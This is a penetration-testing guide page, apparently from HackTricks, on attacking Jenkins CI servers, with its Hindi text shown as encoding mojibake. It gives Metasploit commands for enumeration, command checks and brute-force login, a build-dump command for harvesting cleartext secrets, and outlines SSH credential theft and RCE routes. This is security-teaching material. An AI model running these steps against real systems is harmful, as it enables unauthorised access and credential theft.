# Jenkins рд╕реБрд░рдХреНрд╖рд╛

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣ рдЕрдирдиреНрдп [**NFTs**](https://opensea.io/collection/the-peass-family)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

Jenkins рдПрдХ рд╕рд░рд▓ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдПрдХ **рдирд┐рд░рдВрддрд░ рдПрдХреАрдХрд░рдг** рдпрд╛ **рдирд┐рд░рдВрддрд░ рд╡рд┐рддрд░рдг** (CI/CD) рдкрд░реНрдпрд╛рд╡рд░рдг рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓рдЧрднрдЧ **рдХрд┐рд╕реА рднреА** рднрд╛рд╖рд╛ рдФрд░ рд╕реНрд░реЛрдд рдХреЛрдб рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреЗ рд╕рдВрдпреЛрдЬрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╕рд╛рде рд╣реА рдЕрдиреНрдп рдирд┐рдпрдорд┐рдд рд╡рд┐рдХрд╛рд╕ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред Jenkins рд╡реНрдпрдХреНрддрд┐рдЧрдд рдЪрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рдиреЗ рдХреА **рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ**, рд▓реЗрдХрд┐рди рдпрд╣ рдЖрдкрдХреЛ рдЕрдкрдиреА рдкреВрд░реА рдмрд┐рд▓реНрдб, рдкрд░реАрдХреНрд╖рдг рдФрд░ рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рдЙрдкрдХрд░рдг рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдЕрдкрдиреЗ рдЖрдк рд╕рдВрдпреЛрдЬрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рддреЗрдЬрд╝ рдФрд░ рдордЬрдмреВрдд рддрд░реАрдХрд╛ рджреЗрддрд╛ рд╣реИ рдЬреЛ рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ рдЦреБрдж рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред\
[рдпрд╣рд╛рдВ](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html) рд╕реЗ рдкрд░рд┐рднрд╛рд╖рд╛ред

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## рдЕрдкреНрд░рдорд╛рдгрд┐рдд рдЬрд╛рдБрдЪ

рдЕрдкреНрд░рдорд╛рдгрд┐рдд рдЬрд╛рдБрдЪ рдХреЗ рд▓рд┐рдП рд░реЛрдЪрдХ Jenkins рдкреЗрдЬреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (рдЬреИрд╕реЗ _/people_ рдпрд╛ _/asynchPeople_, рдпрд╣ рдореМрдЬреВрджрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рд╕реВрдЪреА рджреЗрддрд╛ рд╣реИ) рдЖрдк рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдкрдХреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗ рдмрд┐рдирд╛ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
msf> use auxiliary/scanner/http/jenkins_command
```
рдЕрднрд┐рдХреНрд░рд┐рдпрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ /asynchPeople/ рдпрд╛ /securityRealm/user/admin/search/index?q= рдореЗрдВ рдмрд┐рдирд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЗ рдЖрдк **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рдХреЗ рд▓рд┐рдП рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк рдЬреЗрдВрдХрд┐рдиреНрд╕ рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рдкрде /oops/ рдпрд╛ /error/ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

![](<../../.gitbook/assets/image (48).png>)

### рдЬреНрдЮрд╛рдд рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реНрдмрд▓рддрд╛рдПрдВ

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## рд▓реЙрдЧрд┐рди

рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА рдореЗрдВ рдЖрдк **рдЬреЗрдВрдХрд┐рдиреНрд╕ рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рд╕рднреА рддрд░реАрдХреЛрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### рд░рдЬрд┐рд╕реНрдЯрд░

рдЖрдк рдЬреЗрдВрдХрд┐рдиреНрд╕ рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрдЬ рдвреВрдВрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ рдПрдХ рдЦрд╛рддрд╛ рдмрдирд╛рдиреЗ рдФрд░ рдЙрд╕рдХреЗ рдЕрдВрджрд░ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред рдЗрддрдирд╛ рд╣реА рд╕рд░рд▓ рд╣реИред

### SSO рд▓реЙрдЧрд┐рди

рдпрджрд┐ SSO рдХреА рд╕реБрд╡рд┐рдзрд╛/рдкреНрд▓рдЧрдЗрди рдореМрдЬреВрдж рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдПрдХ рдкрд░реАрдХреНрд╖рдг рдЦрд╛рддрд╛ (рдЬреИрд╕реЗ рдХрд┐ рдПрдХ рдкрд░реАрдХреНрд╖рдг Github/Bitbucket рдЦрд╛рддрд╛) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред [рдпрд╣рд╛рдВ](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/) рд╕реЗ рдЯреНрд░рд┐рдХред

### рдмреНрд░реВрдЯрдлреЛрд░реНрд╕

рдЬреЗрдВрдХрд┐рдиреНрд╕ рдХрд┐рд╕реА рднреА рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐ рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рд░реЛрдХрдиреЗ рдХрд╛ рдХреЛрдИ рднреА рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдЖрдкрдХреЛ рд╣рдореЗрд╢рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд╛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рд╕рдВрднрд╡рддрдГ рдХрдордЬреЛрд░ рдкрд╛рд╕рд╡рд░реНрдб (рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб) рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣рд╛ рд╣реИред
```
msf> use auxiliary/scanner/http/jenkins_login
```
### рдкрд╛рд╕рд╡рд░реНрдб рд╕реНрдкреНрд░реЗрдЗрдВрдЧ

[рдЗрд╕ рдкрд╛рдпрдерди рд╕реНрдХреНрд░рд┐рдкреНрдЯ](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py) рдпрд╛ [рдЗрд╕ рдкрд╛рд╡рд░рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ](https://github.com/chryzsh/JenkinsPasswordSpray) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

### рдЖрдИрдкреА рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯрд┐рдВрдЧ рдмрд╛рдИрдкрд╛рд╕

рдХрдИ рд╕рдВрдЧрдарди **SaaS рдЖрдзрд╛рд░рд┐рдд рд╕реНрд░реЛрдд рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рдмрдВрдзрди (SCM) рд╕рд┐рд╕реНрдЯрдо** (рдЬреИрд╕реЗ GitHub рдпрд╛ GitLab) рдХреЛ рдПрдХ **рдЖрдВрддрд░рд┐рдХ**, рд╕реНрд╡-рд╣реЛрд╕реНрдЯреЗрдб **CI** рд╕рдорд╛рдзрд╛рди (рдЬреИрд╕реЗ Jenkins, TeamCity) рдХреЗ рд╕рд╛рде рдХрдВрдмрд╛рдЗрди рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ рдЗрди CI рд╕рд┐рд╕реНрдЯрдо рдХреЛ **SCM** рдХреЗ рд╡реЗрдмрд╣реБрдХ рдШрдЯрдирд╛рдУрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рдХрд░рддрд╛ рд╣реИ, рдмрд╕ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдЬреЙрдмреНрд╕ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

рдЗрд╕рд▓рд┐рдП, рд╕рдВрдЧрдарди **SCM** рдХреЗ **рдЖрдИрдкреА** рд░реЗрдВрдЬ рдХреЛ **рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ** рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЙрдиреНрд╣реЗрдВ **рдЖрдВрддрд░рд┐рдХ** CI рд╕рд┐рд╕реНрдЯрдо рддрдХ **рд╡реЗрдмрд╣реБрдХ** рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдХреЛрдИ рднреА** рдПрдХ **рдЦрд╛рддрд╛** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ **рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдЬреЛ рдЙрд╕ **рдЖрдВрддрд░рд┐рдХ CI рд╕рд┐рд╕реНрдЯрдо** рдХреЛ рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИред

{% content-ref url="scm-ip-whitelisting-bypass.md" %}
[scm-ip-whitelisting-bypass.md](scm-ip-whitelisting-bypass.md)
{% endcontent-ref %}

## рдЖрдВрддрд░рд┐рдХ Jenkins рджреБрд░реБрдкрдпреЛрдЧ

рдЗрди рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рд╣рдо рдорд╛рдиреЗрдВрдЧреЗ рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ Jenkins рддрдХ рдкрд╣реБрдВрдЪ рдХреЗ рд▓рд┐рдП рдПрдХ рдорд╛рдиреНрдп рдЦрд╛рддрд╛ рд╣реИред

{% hint style="warning" %}
Jenkins рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЧрдИ **рдЕрдзрд┐рдХреГрддрддрд╛** рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рдФрд░ рд╕рдВрдХреНрд░рдорд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЕрдиреБрдорддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЖрдк **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣рдорд▓реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛рдирд╛

рдпрджрд┐ рдЖрдкрдиреЗ Jenkins рддрдХ рдкрд╣реБрдВрдЪ рд╣рд╛рд╕рд┐рд▓ рдХреА рд╣реИ рддреЛ рдЖрдк [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/) рдореЗрдВ рдЕрдиреНрдп рдкрдВрдЬреАрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред

### рдХреНрд▓рд┐рдпрд░рдЯреЗрдХреНрд╕реНрдЯ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдмрд┐рд▓реНрдб рдбрдВрдк рдХрд░рдирд╛

рдЙрдореНрдореАрдж рд╣реИ рдХрд┐ рдЖрдк рдХреНрд▓рд┐рдпрд░рдЯреЗрдХреНрд╕реНрдЯ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП [рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЬреЛ рдмрд┐рд▓реНрдб рдХрдВрд╕реЛрд▓ рдЖрдЙрдЯрдкреБрдЯ рдФрд░ рдмрд┐рд▓реНрдб рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░реЛрдВ рдХреЛ рдбрдВрдк рдХрд░рддрд╛ рд╣реИред
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЪреЛрд░реА рдХрд░рдирд╛**

рдпрджрд┐ рд╕рдВрдХреНрд░рдорд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ **рдирдпрд╛ Jenkins рдиреЛрдб рдмрдирд╛рдиреЗ / рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рд╣реИрдВ рдФрд░ SSH рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИрдВ рддрд╛рдХрд┐ рдЕрдиреНрдп рдиреЛрдбреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛ рд╕рдХреЗ, рддреЛ рд╡рд╣ рдирдпрд╛ рдиреЛрдб рдмрдирд╛рдХрд░ / рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ **рдЙрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИ** рдФрд░ **рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рд░рд┐рдХреЙрд░реНрдб рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╣реЛрд╕реНрдЯ рдХреЛ рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдЬрд╣рд╛рдВ рд╣реЛрд╕реНрдЯ рдХреА рдХреБрдВрдЬреА рдХреА рдкреБрд╖реНрдЯрд┐ рдирд╣реАрдВ рдХреА рдЬрд╛рдПрдЧреА:

![](<../../.gitbook/assets/image (56).png>)

рдЖрдк рдЖрдорддреМрд░ рдкрд░ Jenkins ssh рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдПрдХ **рд╡реИрд╢реНрд╡рд┐рдХ рдкреНрд░рджрд╛рддрд╛** (`/credentials/`) рдореЗрдВ рдкрд╛рдПрдВрдЧреЗ, рдЗрд╕рд▓рд┐рдП рдЖрдк рдЙрдиреНрд╣реЗрдВ рдХрд┐рд╕реА рдЕрдиреНрдп рдЧреБрдкреНрдд рд╕реЗ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [**рдЧреБрдкреНрдд рд╕реЗ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рдЦрдВрдб рдореЗрдВ**](./#dumping-secrets)ред

### **Jenkins рдореЗрдВ RCE**

Jenkins рд╕рд░реНрд╡рд░ рдореЗрдВ **рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛** рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╕рднреА **рдЧреБрдкреНрдд** рдФрд░ **рдПрдирд╡реА рдкрд░рд┐рд╡рд░реНрддрди** рд▓реАрдХ рдХрд░рдиреЗ рдФрд░ **рдЙрдиреНрд╣реЗрдВ рд╢реЛрд╖рдг рдХрд░рдиреЗ** рдХрд╛ рдЕрд╡рд╕рд░ рджреЗрддрд╛ рд╣реИ рдФрд░ рд╕рд╛рде рд╣реА **рдЙрд╕реА рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕реНрдерд┐рдд рдЕрдиреНрдп рдорд╢реАрдиреЛрдВ** рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ **рдХреНрд▓рд╛рдЙрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рднреА рдЗрдХрдЯреНрдард╛ рдХрд░рдиреЗ рдХрд╛ рдЕрд╡рд╕рд░ рджреЗрддрд╛ рд╣реИред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, Jenkins **"рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдПрдБрдЧреЗ" рдирд┐рд░реНрдорд╛рдг** рдХрд░реЗрдЧрд╛ред рдЕрдиреНрдп рд╢рдмреНрджреЛрдВ рдореЗрдВ, рдЗрд╕реЗ **рд╕рдмрд╕реЗ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рд╕рд┐рд╕реНрдЯрдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдирд┐рд░реНрдорд╛рдг рдХреЗ рджреМрд░рд╛рди рдХрд┐рд╕реА рднреА рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреЛ рд╡рд╣ рдЪрд╛рд╣реЗ рдЬреЛ рднреА рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред

### **рдкрд░рд┐рдпреЛрдЬрдирд╛ рдмрдирд╛рдирд╛ / рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ RCE**

рдкрд░рд┐рдпреЛрдЬрдирд╛ рдмрдирд╛рдирд╛ / рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдПрдХ рддрд░реАрдХрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ Jenkins рд╕рд░реНрд╡рд░ рдкрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovy рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛**

рдЖрдк рдПрдХ Groovy рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рднреА RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдирдП рдкрд░рд┐рдпреЛрдЬрдирд╛ рдмрдирд╛рдиреЗ рд╕реЗ рдЫрд┐рдкрдХрд▓реА рдЬреИрд╕рд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдмрдирд╛рдирд╛ / рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛

рдЖрдк **рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдмрдирд╛рдиреЗ / рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рднреА RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## рдкрд╛рдЗрдкрд▓рд╛рдЗрди рд╢реЛрд╖рдг

рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЕрднреА рднреА Jenkins рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред

### рдмрд┐рд▓реНрдб рдкрд╛рдЗрдкрд▓рд╛рдЗрди

**рдкрд╛рдЗрдкрд▓рд╛рдЗрди** рдХреЛ **рдкрд░рд┐рдпреЛрдЬрдирд╛рдУрдВ рдореЗрдВ рдирд┐рд░реНрдорд╛рдг рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо** рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреЗ рдЕрдВрджрд░ рдПрдХ **рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** рдЬрд┐рд╕рдореЗрдВ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рд╕рд┐рдВрдЯреИрдХреНрд╕ рд╣реЛрдЧрд╛ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `/Jenkinsfile` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

![](<../../.gitbook/assets/image (14) (1) (1).png>)

рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ **рдЕрдиреНрдп рд╕реНрдерд╛рдиреЛрдВ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рдП** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ) рдЬрд╣рд╛рдВ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА **рдкрд╣реБрдВрдЪ** рдФрд░ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдкрд╣реБрдВрдЪ рдХреЛ **рдЕрд▓рдЧ рдХрд░рдиреЗ** рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

